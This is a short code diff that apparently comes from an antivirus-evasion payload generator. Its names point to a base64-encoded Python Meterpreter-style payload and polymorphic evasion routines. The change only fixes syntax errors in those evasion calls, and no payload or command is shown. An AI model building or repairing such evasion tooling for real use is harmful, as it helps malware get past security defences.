@@ -35,11 +35,11 @@ wine = sys.argv[3]
 Pytherpreter= "base64.b64decode(\"" + b64encode(Pytherpreter) + "\")\n"
 
 Randptr = varname_creator()
-Randbytesnumb = str(random.randint(1000,9999))
+Randbytesnumb = str(randint(1000,9999))
 
-MorphEvasion1 = python_poly_multipath(randint(1,3),1))
-MorphEvasion2 = python_poly_multipath(randint(1,3),2))
-MorphEvasion3 = python_poly_multipath(randint(1,3),3))
+MorphEvasion1 = python_poly_multipath(randint(1,3),1)
+MorphEvasion2 = python_poly_multipath(randint(1,3),2)
+MorphEvasion3 = python_poly_multipath(randint(1,3),3)
 
 
 Hollow_code = ""
